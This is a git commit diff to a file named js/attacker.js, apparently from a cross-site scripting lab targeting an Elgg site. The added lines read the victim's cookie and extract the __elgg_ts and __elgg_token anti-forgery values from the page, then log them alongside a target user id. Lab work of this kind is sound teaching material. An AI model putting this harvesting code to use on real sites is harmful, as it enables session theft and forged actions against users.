a26f3bba509d15dc88ea7b5f15502206640b2923
EnzeXu <xue20@wfu.edu>
2021-12-06 05:33:33 -0500

    sth

--- js/attacker.js
+++ js/attacker.js
@@ -1,5 +1,12 @@
 console.log("Hello I am the attacker!");
-console.log(document.all[37].attributes[0].nodeValue);
-console.log(document.all[37].attributes[0].nodeValue);
+console.log(document.all[35].attributes[0].nodeValue);
+
+let __elgg_ts = String(document.all[35].attributes[0].nodeValue).substr(49,10);
+let __elgg_token = String(document.all[35].attributes[0].nodeValue).substr(74,22);
 let samy_id = 47;
-console.log(document.cookie);
+let cookie = document.cookie;
+console.log("samy_id = " + String(samy_id));
+console.log("cookie = " + cookie);
+console.log("__elgg_ts = " + __elgg_ts);
+console.log("__elgg_token = " + __elgg_token);
+
